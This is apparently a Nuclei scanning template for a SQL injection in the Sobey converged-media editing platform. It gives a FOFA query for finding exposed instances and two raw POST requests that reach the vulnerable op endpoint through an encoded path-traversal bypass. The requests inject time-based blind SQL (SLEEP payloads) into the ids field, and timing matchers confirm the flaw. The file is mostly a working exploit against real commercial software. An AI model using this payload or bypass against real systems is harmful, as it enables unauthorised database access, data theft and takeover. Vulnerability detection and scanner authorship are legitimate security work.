id: sobey-media-op-sqli
info:
  name: "索贝融媒体工作平台 op接口SQL注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="SOBEY-融媒体"
          索贝产品中的 /sobey-mchEditor/tianma/op 接口存在SQL注入漏洞，攻击者可通过注入恶意SQL负载可能泄露敏感数据或导致数据库被接管。
  tags: 索贝融媒体
http:
- raw:
  - |
    POST /sobey-mchEditor/js/%2e%2e/tianma/op HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    opstatus=up&siteCode=1&token=1&ids=1') OR (SELECT 1337 FROM (SELECT(SLEEP(5)))test)-- -
  - |
    POST /sobey-mchEditor/js/%2e%2e/tianma/op HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    opstatus=up&siteCode=1&token=1&ids=1') OR (SELECT 1337 FROM (SELECT(SLEEP(8)))test)-- -
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
